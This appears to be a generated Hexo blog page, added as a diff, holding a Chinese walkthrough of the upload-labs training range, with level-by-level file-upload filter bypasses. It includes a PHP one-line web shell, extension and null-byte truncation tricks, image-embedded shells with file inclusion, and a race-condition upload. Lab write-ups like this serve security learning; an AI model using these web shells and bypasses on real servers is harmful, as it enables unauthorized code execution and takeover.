@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Hexo
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            upload-labs通关攻略
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h3 id="upload-labs通关攻略"><a href="#upload-labs通关攻略" class="headerlink" title="upload-labs通关攻略"></a>upload-labs通关攻略</h3><h5 id="第一关-js检查"><a href="#第一关-js检查" class="headerlink" title="第一关-js检查"></a>第一关-js检查</h5><p>创建一个.png文件，里面加上 <?php @eval($_POST[cmd]); ?>语句（密码为cmd）</p>
+<p>上传，用burpsiute抓包</p>
+<p>将filename的后缀名png改为php</p>
+<p>即可</p>
+<h5 id="第二关-只验证Content-type"><a href="#第二关-只验证Content-type" class="headerlink" title="第二关-只验证Content-type"></a>第二关-只验证Content-type</h5><p>同第一关</p>
+<h5 id="第三关-黑名单绕过"><a href="#第三关-黑名单绕过" class="headerlink" title="第三关-黑名单绕过"></a>第三关-黑名单绕过</h5><p>同第一关</p>
+<p>把后缀改为phtml</p>
+<h5 id="第四关-htaccess"><a href="#第四关-htaccess" class="headerlink" title="第四关-htaccess"></a>第四关-htaccess</h5><p>同上</p>
+<p>后缀改为htaccess</p>
+<h5 id="第五关-大小写绕过"><a href="#第五关-大小写绕过" class="headerlink" title="第五关-大小写绕过"></a>第五关-大小写绕过</h5><p>同上</p>
+<p>后缀改为PHP</p>
+<h5 id="第六关-空格绕过"><a href="#第六关-空格绕过" class="headerlink" title="第六关-空格绕过"></a>第六关-空格绕过</h5><p>同上</p>
+<p>后缀改为php   (php后面加一个空格)</p>
+<h5 id="第七关-点绕过"><a href="#第七关-点绕过" class="headerlink" title="第七关-点绕过"></a>第七关-点绕过</h5><p>同上</p>
+<p>后缀改为php.</p>
+<h5 id="第八关-DATA绕过"><a href="#第八关-DATA绕过" class="headerlink" title="第八关-::$DATA绕过"></a>第八关-::$DATA绕过</h5><p>同上</p>
+<p>后缀改为php.::$DATA</p>
+<h5 id="第九关-点-空格-点绕过"><a href="#第九关-点-空格-点绕过" class="headerlink" title="第九关-点+空格+点绕过"></a>第九关-点+空格+点绕过</h5><p>同上</p>
+<p>后缀改为 php. .</p>
+<h5 id="第十关-双写绕过"><a href="#第十关-双写绕过" class="headerlink" title="第十关-双写绕过"></a>第十关-双写绕过</h5><p> 同上</p>
+<p>后缀改为 pphphp</p>
+<h5 id="第十一关（00截断）"><a href="#第十一关（00截断）" class="headerlink" title="第十一关（00截断）"></a>第十一关（00截断）</h5><p>这一关采用的是白名单过滤的方法，并且将上传文件的后缀名改为白名单里的后缀名</p>
+<p>在save_path里修改（此次上传的文件名为info.png)</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/b18483ccbd24b1bb.png" alt="image-20220414162226844"></p>
+<p>再把文件名修改为.jpg</p>
+<p><strong>注：需要在低版本靶场使用，5.3.29以下使用00截断，高版本不能使用</strong></p>
+<h5 id="第十二关-00截断"><a href="#第十二关-00截断" class="headerlink" title="第十二关-00截断"></a>第十二关-00截断</h5><p>burpsuite抓包之后，在upload/info.php之后加一个‘，而后在Hex中找到’的位置，将其对应的数字改为00即可</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/f0d7fb9b3b94eee2.png" alt="image-20220414162755542"></p>
+<h5 id="第十三关-图片码绕过"><a href="#第十三关-图片码绕过" class="headerlink" title="第十三关-图片码绕过"></a>第十三关-图片码绕过</h5><p>上传.gif文件</p>
+<p>抓包之后，将<?php phpinfo();?>写入（位置任意）</p>
+<p>发送之后，解析gif文件：</p>
+<p><a target="_blank" rel="noopener" href="http://158.247.233.5:51570/include.php?**file=upload**/8520220412071008.gif">http://158.247.233.5:51570/include.php?**file=upload**/8520220412071008.gif</a></p>
+<h5 id="第十四关-getimagesize-图片码"><a href="#第十四关-getimagesize-图片码" class="headerlink" title="第十四关-getimagesize()-图片码"></a>第十四关-getimagesize()-图片码</h5><p>同十三关</p>
+<h5 id="第十五关-exif-imagetype-图片马"><a href="#第十五关-exif-imagetype-图片马" class="headerlink" title="第十五关-exif_imagetype()-图片马"></a>第十五关-exif_imagetype()-图片马</h5><p>同十三关</p>
+<h5 id="第十六关-二次渲染绕过"><a href="#第十六关-二次渲染绕过" class="headerlink" title="第十六关-二次渲染绕过"></a>第十六关-二次渲染绕过</h5><p>开启<code>php_exif</code>模块。</p>
+<p>上传一张gif，右键将其另存到其他地方（此时已被渲染），用其制作图片码上传</p>
+<p>其余同13关</p>
+<h5 id="第十七关-条件竞争"><a href="#第十七关-条件竞争" class="headerlink" title="第十七关-条件竞争"></a>第十七关-条件竞争</h5><p>二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符/图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败.<br>图片马可以上传但是却没有解析，因为二次渲染把PHP代码删掉了<br>把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。（比较工具：HxD Hex Editor）</p>
+<h5 id="第十八关-条件竞争"><a href="#第十八关-条件竞争" class="headerlink" title="第十八关-条件竞争"></a>第十八关-条件竞争</h5><p>直接上传一个php文件，然后进行抓包，将数据包发送至intruder下，清空变量，修改payload type为null payloads，再修改线程，number of threads为20，然后发包，用另一个浏览器一直访问18.php地址，只要在上传的一瞬间，他还没来的及删除、修改就可以</p>
+<h5 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h5><p>00截断，同上<br>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.<br>或者burp抓包，将upload-19.jpg改为upload-19.php/.</p>
+<h5 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h5><p>上传.png文件，（内含PHP一句话木马）</p>
+<p>burpsuite抓包，将upload-20.jpg改为upload-20.php/.</p>
+<p>放包，用蚁剑连接即可</p>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
